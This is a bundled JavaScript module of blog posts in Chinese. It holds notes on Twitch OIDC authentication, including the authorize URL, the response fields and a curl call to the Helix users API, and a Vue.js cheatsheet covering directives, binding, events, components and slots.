href=\"http://retroanimu.tumblr.com/\">ハッピータイム</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://tamaki.bake-neko.net/topb30b.htm\">ＴＯＰ更新：新横浜ありな</a></li>\n</ul>\n","date":"2019-10-21T18:10:11.000Z","excerpt":"","printDate":"October 21, 2019","printReadingTime":"7 min read"};

var route_72 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod73
});

var Mod74 = {"title":"Twitch API","slug":"twitch-api","html":"<h2 id=\"twitch-oidc-認證響應\">Twitch OIDC 認證響應</h2>\n<ul>\n<li>Twitch API 文件：<a target=\"_blank\" rel=\"nofollow\" href=\"https://dev.twitch.tv/docs/authentication\">Authentication | Twitch Developers</a></li>\n<li>註冊 Twitch APP：<a target=\"_blank\" rel=\"nofollow\" href=\"https://dev.twitch.tv/console/apps\">Twitch Developers</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://pjchender.blogspot.com/2018/08/js-javascript-url-parameters.html\">[JS] 使用 JavaScript 解析網址與處理網址中的參數（URL Parameters） ~ PJCHENder&lt;br&gt;那些沒告訴你的小細節</a></li>\n</ul>\n<h3 id=\"驗證\">驗證</h3>\n<p><code>GET https://id.twitch.tv/oauth2/authorize ?client_id=&lt;your client ID&gt; &amp;redirect_uri=&lt;your registered redirect URI&gt; &amp;response_type=&lt;type&gt; &amp;scope=&lt;space-separated list of scopes&gt; &amp;claims=&lt;JSON object specifying requested claims&gt;</code></p>\n<h4 id=\"成功\">成功</h4>\n<p><code>&lt;path-to-page&gt;#access_token=&lt;access_token&gt;&amp;id_token=&lt;id_token&gt;&amp;scope=openid+user_read&amp;token_type=bearer</code></p>\n<ol>\n<li><code>access_token</code></li>\n<li><code>id_token</code></li>\n<li><code>scope</code></li>\n<li><code>token_type</code></li>\n</ol>\n<p><code>id_token</code> decoded:</p>\n<ol>\n<li><code>at_hash</code></li>\n<li><code>aud</code>: Audience: client ID of the application requesting a user&#39;s authorization.</li>\n<li><code>azp</code>: Authorized party: client ID of the application which is being authorized. Currently the same as aud.</li>\n<li><code>exp</code>: Expiration time of the token. This is in UNIX/Epoch format.</li>\n<li><code>iat</code>: Time when the token was issued. This is in UNIX/Epoch format.</li>\n<li><code>iss</code>: Issuer of the token.</li>\n<li><code>preferred_username</code>: Display name of the authorizing user.</li>\n<li><code>sub</code>: User ID of the authorizing user.</li>\n</ol>\n<h4 id=\"失敗\">失敗</h4>\n<p><code>&lt;path-to-page&gt;?error=redirect_mismatch&amp;error_description=Parameter+redirect_uri+does+not+match+registered+URI</code></p>\n<ol>\n<li><code>error</code></li>\n<li><code>error_description</code></li>\n</ol>\n<h3 id=\"取得使用者帳號\">取得使用者帳號</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">curl  -H 'Client-ID: uo6dggojyb8d6soh92zknwmi5ej1q2' \\\n-H 'Authorization: Bearer cfabdegwdoklmawdzdo98xt2fo512y' \\\n-X GET 'https://api.twitch.tv/helix/users?id=44322889'</code></pre>","date":"2020-11-08T23:50:09.000Z","excerpt":"","printDate":"November 8, 2020","printReadingTime":"1 min read"};

var route_70 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod74
});

var Mod75 = {"title":"Vue Cheatsheet","slug":"vue-cheatsheet","html":"<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.vuemastery.com/pdf/Vue-Essentials-Cheat-Sheet.pdf\">Vue-Essentials-Cheat-Sheet.pdf</a></p>\n<h2 id=\"expressions\">Expressions</h2>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>I have a {{ product }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>{{ product + 's' }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>{{ isWorking ? 'YES' : 'NO' }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>{{ product.getSalePrice() }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><h2 id=\"directives\">Directives</h2>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">v-if</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>inStock<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>{{ product }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">v-else-if</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>onSale<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">v-else</span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></code></pre><p>Toggles CSS property: <code>display: none</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">v-show</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>showProductDetails<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></code></pre><p>Two-way data binding</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">v-model</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>firstName<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></code></pre><ul>\n<li><code>v-model.lazy=&quot;...&quot;</code></li>\n<li><code>v-model.number=&quot;...&quot;</code></li>\n<li><code>v-model.trim=&quot;...&quot;</code></li>\n</ul>\n<h2 id=\"list-rendering\">List Rendering</h2>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">v-for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item in items<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">:key</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item.id<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>{{ item }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span></code></pre><p>取得陣列座標：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">v-for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(item, index) in items<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span></code></pre><p>遞迴物件：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">v-for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(value, key) in object<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span></code></pre><p>使用於 component 時：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>cart-product</span>\n  <span class=\"token attr-name\">v-for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>iotem in products<span class=\"token punctuation\">\"</span></span>\n  <span class=\"token attr-name\">:profuct</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item<span class=\"token punctuation\">\"</span></span>\n  <span class=\"token attr-name\">:key</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item.id<span class=\"token punctuation\">\"</span></span>\n<span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>cart-product</span><span class=\"token punctuation\">></span></span></code></pre><h2 id=\"binding\">Binding</h2>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\"><span class=\"token namespace\">v-bind:</span>href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>url<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></code></pre><p>可簡寫為</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">:href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>url<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">:disabled</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>isButtonDisabled<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span></code></pre><p>當 <code>isActive</code> 為真時，會加入 <code>active</code> class</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">:class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{ active: isActive }<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">:</span><span class=\"token style-attr language-css\"><span class=\"token attr-name\"><span class=\"token attr-name\">style</span></span><span class=\"token punctuation\">=\"</span><span class=\"token attr-value\"><span class=\"token punctuation\">{</span> <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> activeColor <span class=\"token punctuation\">}</span></span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><h2 id=\"actions--events\">Actions / Events</h2>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\"><span class=\"token namespace\">v-on:</span>click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>addToCart<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span></code></pre><p>可簡寫為</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">@click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>addToCart<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span></code></pre><p>可傳入參數</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">@click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>addToCart(product)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span></code></pre><p>可預防如重載頁面的預設行為</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">@submit.prevent</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>addProduct<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>...<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></code></pre><p>或只觸發一次</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">@mouseover.once</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>showImage<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>...</code></pre><ul>\n<li><code>.stop</code>：阻止所有 event propagation</li>\n<li><code>.self</code>：只有當 <code>event.target</code> 為元素本身時才觸發</li>\n</ul>\n<p>按鍵觸發：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">@keyup.enter</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></code></pre><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">@keyup.ctrl.c</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>onCopy<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></code></pre><p>按鍵裝飾詞：</p>\n<ul>\n<li><code>.tab</code></li>\n<li><code>.delete</code></li>\n<li><code>.esc</code></li>\n<li><code>.space</code></li>\n<li><code>.up</code></li>\n<li><code>.down</code></li>\n<li><code>.left</code></li>\n<li><code>.right</code></li>\n<li><code>.crtl</code></li>\n<li><code>.alt</code></li>\n<li><code>.shift</code></li>\n<li><code>.meta</code></li>\n</ul>\n<p>滑鼠裝飾詞：</p>\n<p><code>.left</code>\n<code>.right</code>\n<code>.middle</code></p>\n<h2 id=\"component-anatomy\">Component Anatomy</h2>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">'my-component'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  components<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// Components that can be used in template</span>\n    ProductComponent<span class=\"token punctuation\">,</span> ReviewComponent\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  props<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// The parameters the component accepts</span>\n    message<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    product<span class=\"token operator\">:</span> Object<span class=\"token punctuation\">,</span>\n    email<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n      required<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token string\">\"none\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token function-variable function\">validator</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// Should return true if value is vaild</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token function-variable function\">data</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// must be a function</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>\n      firstName<span class=\"token operator\">:</span> <span class=\"token string\">'Vue'</span><span class=\"token punctuation\">,</span>\n      lastName<span class=\"token operator\">:</span> <span class=\"token string\">'Mastery'</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  computed<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// Return cached values until dependcies change</span>\n    <span class=\"token function-variable function\">fullName</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>firstName <span class=\"token operator\">+</span> <span class=\"token string\">' '</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lastName\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  watch<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// called when firstName changes value</span>\n    <span class=\"token function-variable function\">firstName</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">value<span class=\"token punctuation\">,</span> oldValue</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span> <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  methods<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  template<span class=\"token operator\">:</span> '<span class=\"token operator\">&lt;</span>span<span class=\"token operator\">></span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> message <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n  <span class=\"token comment\">// Can also use backticks for multi-line</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre><h2 id=\"custom-events\">Custom Events</h2>\n<p>Use props (above) to pass data into child components,\ncustom events to pass data to parent elements.</p>\n<p>Set listener on component, within its parent:</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button-counter</span> <span class=\"token attr-name\"><span class=\"token namespace\">v-on:</span>incrementBy</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>incWithVal<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button-counter</span><span class=\"token punctuation\">></span></span></code></pre><p>Inside parent component:</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">methods<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n<span class=\"token function-variable function\">incWithVal</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">toAdd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span> <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre><p>Inside button-counter template:</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">$emit</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"incrementBy\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h2 id=\"lifecycle-hooks\">Lifecycle Hooks</h2>\n<ul>\n<li><code>beforeCreate</code></li>\n<li><code>created</code></li>\n<li><code>beforeMount</code></li>\n<li><code>mounted</code></li>\n<li><code>beforeUpdate</code></li>\n<li><code>updated</code></li>\n<li><code>beforeDestroy</code></li>\n<li><code>destroyed</code></li>\n</ul>\n<h2 id=\"using-a-single-slot\">Using A Single Slot</h2>\n<p>Component template:</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>I'm a title<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>slot</span><span class=\"token punctuation\">></span></span> Only displayed if no slot content <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>slot</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><p>Use of component with data for slot:</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>my-component</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>This will go in the slot<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>my-component</span><span class=\"token punctuation\">></span></span></code></pre><h2 id=\"multiple-slots\">Multiple Slots</h2>\n<p>Component template:</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>container<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>header</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>slot</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>header<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>slot</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>header</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>main</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>slot</span><span class=\"token punctuation\">></span></span>Default content<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>slot</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>main</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>footer</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>slot</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>footer<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>slot</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>footer</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><p>Use of component with data for slot:</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>app-layout</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">slot</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>header<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Page Title<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>the main content.<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">slot</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>footer<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Contact info<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>app-layout</span><span class=\"token punctuation\">></span></span></code></pre><h2 id=\"libraries-you-should-know\">Libraries You Should Know</h2>\n<ul>\n<li>Vue CLI</li>\n<li>Vue Router</li>\n<li>Vue DevTools</li>\n<li>Nuxt.js</li>\n</ul>\n","date":"2020-08-22T19:37:32.000Z","excerpt":"","printDate":"August 22, 2020","printReadingTime":"3 min read"};

var route_56 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod75
});

